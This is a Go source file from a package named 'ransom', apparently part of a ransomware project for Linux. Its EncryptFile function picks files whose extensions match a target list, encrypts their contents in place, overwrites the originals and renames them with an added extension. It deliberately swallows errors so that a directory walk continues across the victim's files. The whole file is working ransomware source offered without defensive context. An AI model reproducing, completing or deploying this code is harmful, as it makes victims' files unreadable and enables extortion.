//go:build linux
// +build linux

package ransom

import (
	"fmt"
	"io/ioutil"
	"os"
	"strings"
)

func EncryptFile(path string, key []byte) error {
	if strings.HasSuffix(path, extension) {
		return nil
	}

	//This should be a compile time constant so code should get optimized by the compiler
	//Check if the current's file extension is in the dict or list
	if UseDict {
		if extensionDict[GetFileExtensionFastest(path)] != 1 {
			return nil
		}
	} else {
		Len, Extension := len(extensionsSlice), GetFileExtensionFastest(path)
		ok := 0
		for i := 0; i < Len; i++ {
			if extensionsSlice[i] == Extension {
				ok = 1
			}
		}
		if ok == 0 {
			return nil
		}
	}

	data, err := ioutil.ReadFile(path)
	if err != nil {
		//Think of a fix, if the error isn't nil the walk function exits, so we return nil even on errors
		fmt.Println(err)
		return nil
	}
	data = Encrypt(key, data)
	err = ioutil.WriteFile(path, data, 0644)
	if err != nil {
		fmt.Println(err)
		return nil
	}

	var sb strings.Builder
	sb.WriteString(path)
	sb.WriteString(extension)
	err = os.Rename(path, sb.String())
	fmt.Println(err)
	return nil
}
